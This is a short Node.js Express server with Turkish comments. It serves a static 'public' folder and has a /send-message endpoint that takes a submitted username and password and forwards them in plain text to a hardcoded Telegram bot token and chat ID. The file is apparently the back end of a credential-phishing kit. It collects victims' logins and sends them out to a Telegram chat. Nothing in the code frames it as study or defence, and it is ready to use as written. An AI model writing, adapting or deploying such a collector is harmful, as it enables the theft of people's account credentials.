const express = require('express');
const bodyParser = require('body-parser');
const fetch = require('node-fetch');

const app = express();
const PORT = 3000;

// Telegram bot bilgileri
const botToken = '7257816268:AAFAwFDJ9C4657eIqcNXeuQqewmxd9gZjr8';
const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;

// Middleware
app.use(bodyParser.json());
app.use(express.static('public')); // 'public' klasöründeki dosyaları servis eder

// API endpoint
app.post('/send-message', async(req, res) => {
    const { username, password } = req.body;

    if (!username || !password) {
        return res.status(400).json({ error: 'Kullanıcı adı ve şifre gerekli.' });
    }

    const message = `Kullanıcı adı: ${username}\nŞifre: ${password}`;
    try {
        const response = await fetch(telegramUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: '5778953229', // Chat ID
                text: message,
            }),
        });

        const data = await response.json();

        if (data.ok) {
            res.json({ success: 'Mesaj başarıyla gönderildi.' });
        } else {
            res.status(500).json({ error: 'Telegram API hatası.', details: data });
        }
    } catch (error) {
        res.status(500).json({ error: 'Sunucu hatası.', details: error.message });
    }
});

app.listen(PORT, () => {
    console.log(`Sunucu çalışıyor: http://localhost:${PORT}`);
});